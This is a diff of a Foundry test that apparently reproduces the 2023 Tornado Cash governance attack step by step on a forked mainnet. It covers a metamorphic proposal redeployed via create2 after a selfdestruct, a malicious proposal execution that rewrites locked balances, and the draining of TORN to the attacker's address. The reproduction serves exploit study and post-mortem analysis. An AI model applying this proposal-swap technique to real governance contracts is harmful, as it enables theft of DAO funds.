@@ -10,20 +10,32 @@ import {Ownable} from "./AttackerOwnable.sol";
 import "./TornadoGovernance.interface.sol";
 
 contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
+    uint256 forkIdBefore;
+    uint256 forkIdAfter;
+
     IERC20 tornToken = IERC20(0x77777FeDdddFfC19Ff86DB637967013e6C6A116C);
     ITornadoGovernance TORNADO_GOVERNANCE = ITornadoGovernance(0x5efda50f22d34F262c29268506C5Fa42cB56A1Ce);
 
-    address ATTACKER1 = makeAddr("Attacker1");
-    address ATTACKER2 = makeAddr("Attacker2");
+    address ATTACKER1 = 0x092123663804f8801b9b086b03B98D706f77bD59;
+    address ATTACKER2 = 0x592340957eBC9e4Afb0E9Af221d06fDDDF789de9;
 
+    // Contracts used for the setup
     Attacker1Contract attacker1contract;
-
     ReinitializableContractFactory proposalFactory;
     TransientContract transientContract;
     Proposal_20 proposal_20;
 
+    // Contracts used for the attack
+    // The proposal factory used by the attacker
+    address realProposalFactory = 0xAF54612427d97489707332efe0b6290F129DbAcb;
+    address realTransient = 0x7dC86183274b28E9f1a100a0152DAc975361353d;
+    address realProposal = 0xC503893b3e3c0C6b909222b45f2a3a259a52752D;
+    address sampleMinion = 0xb4d47EE99E132e441Ae3467EB7D70F06d61b10C9;
+    address realAttacker1Contract = 0x03eCF0d22f9cCd21144a7d492cf63b471916497A;
+
     function setUp() external {
-        cheat.createSelectFork("mainnet", 17_249_477); // One block before the step 0. happens.
+        forkIdBefore = cheat.createSelectFork("mainnet", 17_248_593);
+        forkIdAfter = cheat.createSelectFork("mainnet", 17_299_106);
 
         // The attacker used two accounts
         cheat.deal(ATTACKER1, 0.5 ether);
@@ -36,13 +48,15 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         _tokenTrackerSetup();
     }
 
-    function test_attack() external {
+    function test_A_setup_attack() external {
+        vm.selectFork(forkIdBefore);
+        console2.log("Fork Block Number: %s", block.number);
+
         console2.log("\n======== STEP 0. DEPLOY FACTORY AND PROPOSAL - GET SOME TORN ========");
         // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0
         vm.startPrank(ATTACKER2);
         _deployFactoryAndProposal();
-        cheat.rollFork(17_248_593);
         _swapEthForTorn();
         _initialTornLock();
         vm.stopPrank();
@@ -51,7 +65,7 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the
         // Attacker 2
         // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0
-        cheat.rollFork(17_249_552);
+        vm.rollFork(17_249_552);
         console2.log("Submitting proposal...");
         vm.startPrank(ATTACKER2);
         TORNADO_GOVERNANCE.propose(
@@ -74,21 +88,67 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("\n======== STEP 3. DESTROY THE PROPOSAL AND TRANSIENT ========");
         // 3. Selfdestruct both the proposal and transient contract
         // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0
-        vm.prank(ATTACKER2);
-        proposalFactory.emergencyStop();
 
-        vm.etch(address(proposal_20), new bytes(0));
-        vm.etch(address(transientContract), new bytes(0));
-
-        assertEq(address(proposal_20).code.length, 0, "Proposal still has code");
-        assertEq(address(transientContract).code.length, 0, "Transient still has code");
-
-        console2.log("\n======== STEP 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
         vm.startPrank(ATTACKER2);
-        _redeployTransientAndProposal();
+        proposalFactory.emergencyStop();
         vm.stopPrank();
     }
 
+    function test_B_redeploy_and_drain() external {
+        vm.selectFork(forkIdAfter);
+        console2.log("Fork Block Number: %s", block.number); // just before the redeployment
+
+        console2.log("\n======== STEP 4. REDEPLOY THE PROPOSAL AND TRANSIENT ========");
+        // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
+        console2.log("Before Redeployment Code Size");
+        console2.log("Transient: %s", realTransient.code.length);
+        console2.log("Proposal: %s", realProposal.code.length);
+
+        vm.startPrank(ATTACKER2);
+        _redeployTransientAndProposal();
+        vm.stopPrank();
+
+        console2.log("\nAfter Redeployment Code Size");
+        console2.log("Transient: %s", realTransient.code.length);
+        console2.log("Proposal: %s", realProposal.code.length);
+
+        console2.log("\n======== STEP 5. EXECUTE MALICIOUS PROPOSAL ========");
+        cheat.rollFork(17_299_138); // just before the execution
+        console2.log("Executing malicious proposal...");
+        // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
+        // mentioned in the proposal #20 description)
+        // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
+        // This execution writes the lockedBalance mapping for the minion accounts previously deployed
+        TORNADO_GOVERNANCE.execute(20);
+
+        console2.log("\n======== STEP 6. DRAIN TORN FROM GOVERNANCE ========");
+        console2.log("Draining TORN balance...");
+
+        // 6. On each of the previously deployed minion, drain the governance by calling unlock() and
+        // transfer() the TORN tokens to the Attacker 1, coordinated by the Attacker Contract
+        // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
+        // The locked balance slots were wrote with 10,000e18 granting that amount of tokens per account
+        // This call is made with a for loop over all the minions.
+        // We will etch a minion impl with ours to show a potential implementation.
+        cheat.rollFork(17_304_425); // just before the drain
+        console2.log("Before Drain ");
+        console2.log("Minion1 TORN Balance: %s", tornToken.balanceOf(sampleMinion));
+        console2.log("Minion1 Locked Balance: %s", TORNADO_GOVERNANCE.lockedBalance(sampleMinion));
+        console2.log("Attacker1 TORN Balance: %s", tornToken.balanceOf(ATTACKER1));
+
+        // This part is coordinated by the Attacker1 minion factory, we will do this directly from here
+        vm.startPrank(sampleMinion);
+        TORNADO_GOVERNANCE.unlock(10_000 ether);
+        tornToken.transfer(ATTACKER1, 10_000 ether);
+        vm.stopPrank();
+
+        console2.log("\nAfter Drain ");
+        console2.log("Minion1 TORN Balance: %s", tornToken.balanceOf(sampleMinion));
+        console2.log("Minion1 Locked Balance: %s", TORNADO_GOVERNANCE.lockedBalance(sampleMinion));
+        console2.log("Attacker1 TORN Balance: %s", tornToken.balanceOf(ATTACKER1));
+    }
+
+    // ======== SETUP & PART I HELPERS ========
     function _swapEthForTorn() internal {
         // We emulate the swap with a token deal (getting 1017 TORN)
         // Swap 1 https://etherscan.io/tx/0x82dca5a88a43377cab4748073a3a46c8aa120d42c5c5d802789cf17df22f0acd
@@ -128,35 +188,31 @@ contract Exploit_TornadoCashGovernance is TestHarness, TokenBalanceTracker {
         console2.log("Proposal 20 deployed at: %s", address(proposal_20));
     }
 
+    // ======== REDEPLOY & PART II HELPERS ========
     function _redeployTransientAndProposal() internal {
-        // Deploy the malicious proposal through a transient
-        (address proposal, address transient) =
-            proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), true);
+        // This is how a redeployment could look like
+        // // Deploy the malicious proposal through a transient
+        // (address proposal, address transient) =
+        //     proposalFactory.createProposalWithTransient(bytes32(bytes20(ATTACKER2)), true);
 
-        proposal_20 = Proposal_20(proposal);
-        transientContract = TransientContract(transient);
+        // proposal_20 = Proposal_20(proposal);
+        // transientContract = TransientContract(transient);
 
-        // Check the transient contract with a read method:
-        address preCalcTransientContract =
-            proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));
+        // // Check the transient contract with a read method:
+        // address preCalcTransientContract =
+        //     proposalFactory.getTransientContractAddress(bytes32(bytes20(ATTACKER2)));
 
-        assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient contract");
-        assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");
+        // assertEq(preCalcTransientContract, address(transientContract), "Wrong address of transient
+        // contract");
+        // assertEq(transientContract.owner(), address(proposalFactory), "Wrong owner in transient contract");
 
-        console2.log("Transient deployed at: %s", address(transientContract));
-        console2.log("Proposal 20 deployed at: %s", address(proposal_20));
+        // console2.log("Transient deployed at: %s", address(transientContract));
+        // console2.log("Proposal 20 deployed at: %s", address(proposal_20));
+
+        // We call the actual attacker's contract showing the redeployment
+        bytes32 redeployTx = 0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122;
+        vm.transact(redeployTx);
     }
-
-    // 4. Re deploy the transient and the new malicious proposal
-    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2
-
-    // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same
-    // mentioned in the proposal #20 description)
-    // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3
-
-    // 6. On each of the previously deployed minion, drain the governance by calling unlock() and
-    // transfer() the TORN tokens to the Attacker 1, coordinated by the Attacker Contract
-    // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
 
     function _labelAccounts() internal {
         cheat.label(address(tornToken), "TORN");
@@ -222,8 +278,6 @@ contract ReinitializableContractFactory is Ownable {
 
         // Create the transient with create2
         deployedTransientContract = address(new TransientContract{salt: _salt}());
-
-        console2.log(deployedTransientContract, transientContractAddress);
 
         // ensure that the contracts were successfully deployed.
         require(
